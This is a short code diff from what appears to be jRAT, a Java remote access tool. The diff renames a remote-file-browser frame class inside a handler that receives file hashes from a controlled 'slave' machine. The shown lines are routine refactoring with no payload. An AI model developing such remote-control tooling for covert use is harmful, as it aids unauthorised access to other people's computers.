@@ -5,7 +5,7 @@ import java.io.DataInputStream;
 import javax.swing.JOptionPane;
 
 import se.jrat.client.Slave;
-import se.jrat.client.ui.frames.FrameRemoteFiles;
+import se.jrat.client.ui.frames.FrameRemoteFilesOld;
 
 
 public class Packet46FileHash extends AbstractIncomingPacket {
@@ -15,7 +15,7 @@ public class Packet46FileHash extends AbstractIncomingPacket {
 		final String md5 = slave.readLine();
 		final String sha1 = slave.readLine();
 
-		FrameRemoteFiles frame = FrameRemoteFiles.instances.get(slave);
+		FrameRemoteFilesOld frame = FrameRemoteFilesOld.instances.get(slave);
 		if (frame != null) {
 			if (frame.waitingForMd5) {
 				new Thread() {
